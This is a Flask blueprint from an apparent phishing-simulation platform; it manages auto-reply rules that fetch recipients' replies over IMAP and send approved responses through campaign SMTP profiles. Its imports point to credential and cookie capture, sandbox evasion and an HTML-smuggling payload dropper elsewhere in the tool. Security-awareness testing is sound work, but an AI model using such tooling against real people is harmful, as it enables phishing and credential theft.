import json
import logging
import base64
import csv
import io
import secrets
import hashlib
from io import BytesIO
from datetime import datetime, timedelta
from urllib.parse import urlparse

from flask import (
    Blueprint, request, redirect, url_for, render_template, session,
    send_file, jsonify, abort, flash, g, make_response, current_app
)
from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Subsidiary, SendingProfile, Campaign, Recipient, Event, Target,
    CampaignJob, RateProfile, AutoReplyRule, PendingReply, User, AuditLog,
    TrainingCompletion, ApiToken, EmailTemplate, CampaignVersion, CanaryToken,
    Webhook, ProxyDomain, DomainReputation, SenderRotationPool,
    SenderRotationEntry, RecipientFingerprint, Redirector,
    CapturedCredential, CapturedCookie
)
from dropoutjeep_lib.utils.auth import (
    login_required, admin_required, operator_required, viewer_required,
    log_audit, get_current_user
)
from dropoutjeep_lib.utils.analytics import get_heatmap_data, get_recipient_timeline, export_campaign_csv, export_campaign_pdf
from dropoutjeep_lib.utils.canary import (
    get_canary_embeds, record_canary_trigger, build_canary_url
)
from dropoutjeep_lib.utils.dkim_utils import (
    generate_dkim_keypair, format_dkim_dns_record, dkim_spf_check, check_dmarc
)
from dropoutjeep_lib.utils.validator import (
    validate_campaign_before_launch, validate_smtp_relay, verify_token_sig,
    check_spf, check_dkim_selector, check_spoof_alignment
)
from dropoutjeep_lib.utils.sandbox_evasion import should_serve_real_page, is_sandbox_ua
from dropoutjeep_lib.utils.html_smuggler import build_html_dropper, encode_payload
from dropoutjeep_lib.utils.domain_reputation import get_or_refresh_domain_reputation
from dropoutjeep_lib.utils.risk import recipient_risk_score, campaign_risk_summary
from dropoutjeep_lib.utils.funnel import compute_funnel
from dropoutjeep_lib.utils.scheduler import sync_campaign_schedules
from dropoutjeep_lib.utils.dialer import Dialer
from dropoutjeep_lib.utils.live import push_event

auto_reply_bp = Blueprint('auto_reply', __name__, url_prefix='/admin/auto-reply')

@auto_reply_bp.route('/')
@operator_required
def admin_auto_reply_rules():
    rules = AutoReplyRule.query.order_by(AutoReplyRule.created_at.desc()).all()
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template('auto_reply_rules.html', rules=rules, campaigns=campaigns)


@auto_reply_bp.route('/new', methods=['POST'])
@operator_required
def admin_auto_reply_new():
    campaign_id = request.form.get('campaign_id')
    rule = AutoReplyRule(
        name=request.form['name'],
        campaign_id=int(campaign_id) if campaign_id else None,
        filter_sender_pattern=request.form.get('filter_sender_pattern'),
        filter_subject_pattern=request.form.get('filter_subject_pattern'),
        reply_template_html=request.form['reply_template_html'],
        reply_subject_template=request.form.get('reply_subject_template', 'Re: {subject}'),
        max_replies_per_session=int(request.form.get('max_replies_per_session') or 10),
        delay_seconds=int(request.form.get('delay_seconds') or 5),
        is_active=request.form.get('is_active') == 'on',
        auto_approve=request.form.get('auto_approve') == 'on',
    )
    db.session.add(rule)
    db.session.commit()
    flash('Auto-reply rule created', 'success')
    return redirect(url_for('admin_auto_reply_rules'))


@auto_reply_bp.route('/<int:rule_id>/toggle', methods=['POST'])
@operator_required
def admin_auto_reply_toggle(rule_id):
    rule = AutoReplyRule.query.get_or_404(rule_id)
    rule.is_active = not rule.is_active
    db.session.commit()
    flash(f'Rule "{rule.name}" {"enabled" if rule.is_active else "disabled"}', 'success')
    return redirect(url_for('admin_auto_reply_rules'))


@auto_reply_bp.route('/<int:rule_id>/delete', methods=['POST'])
@operator_required
def admin_auto_reply_delete(rule_id):
    rule = AutoReplyRule.query.get_or_404(rule_id)
    db.session.delete(rule)
    db.session.commit()
    flash('Auto-reply rule deleted', 'success')
    return redirect(url_for('admin_auto_reply_rules'))


@auto_reply_bp.route('/<int:rule_id>/fetch')
@operator_required
def admin_auto_reply_fetch(rule_id):
    """Poll IMAP and stage matching replies for manual approval."""
    rule = AutoReplyRule.query.get_or_404(rule_id)

    from dropoutjeep_lib.utils.auto_replier import AutoReplier
    try:
        replier = AutoReplier()
        pending = replier.fetch_pending_replies(rule)
    except RuntimeError as e:
        flash(str(e), 'warning')
        return redirect(url_for('admin_auto_reply_rules'))
    for pr in pending:
        # Avoid duplicates by Message-ID + sender.
        exists = PendingReply.query.filter_by(
            rule_id=rule.id,
            original_message_id=pr.get('message_id'),
            original_sender=pr.get('sender')
        ).first()
        if not exists:
            db.session.add(PendingReply(
                rule_id=rule.id,
                campaign_id=rule.campaign_id,
                original_message_id=pr.get('message_id'),
                original_subject=pr.get('subject'),
                original_sender=pr.get('sender'),
                reply_subject=pr.get('reply_subject'),
                reply_body_html=pr.get('reply_body_html'),
                status='pending'
            ))
    db.session.commit()
    flash(f'Fetched {len(pending)} pending replies for approval', 'success')
    return redirect(url_for('admin_auto_reply_pending'))


@auto_reply_bp.route('/pending')
@operator_required
def admin_auto_reply_pending():
    pending = PendingReply.query.filter_by(status='pending') \
        .order_by(PendingReply.created_at.desc()).all()
    return render_template('auto_reply_pending.html', pending=pending)


@auto_reply_bp.route('/pending/<int:reply_id>/send', methods=['POST'])
@operator_required
def admin_auto_reply_send(reply_id):
    """Send a single pending reply using the original campaign sender's SMTP."""
    reply = PendingReply.query.get_or_404(reply_id)
    if reply.status != 'pending':
        flash('Reply already processed', 'warning')
        return redirect(url_for('admin_auto_reply_pending'))

    from dropoutjeep_lib.utils.auto_replier import AutoReplier
    replier = AutoReplier()
    campaign = Campaign.query.get(reply.campaign_id) if reply.campaign_id else None
    sp = campaign.sending_profile if campaign else None

    ok, err = replier.send_reply(reply, sp)
    if ok:
        reply.status = 'sent'
        reply.sent_at = datetime.utcnow()
        db.session.add(Event(
            campaign_id=reply.campaign_id,
            event_type='auto_reply',
            meta=f"to={reply.original_sender} subject={reply.reply_subject}"
        ))
        db.session.commit()
        push_event('auto_reply', campaign_id=reply.campaign_id, meta=f"to={reply.original_sender} subject={reply.reply_subject}")
        flash('Reply sent', 'success')
    else:
        reply.status = 'failed'
        db.session.commit()
        flash(f'Reply failed: {err}', 'danger')
    return redirect(url_for('admin_auto_reply_pending'))


@auto_reply_bp.route('/pending/<int:reply_id>/reject', methods=['POST'])
@operator_required
def admin_auto_reply_reject(reply_id):
    reply = PendingReply.query.get_or_404(reply_id)
    reply.status = 'rejected'
    db.session.commit()
    flash('Reply rejected', 'info')
    return redirect(url_for('admin_auto_reply_pending'))
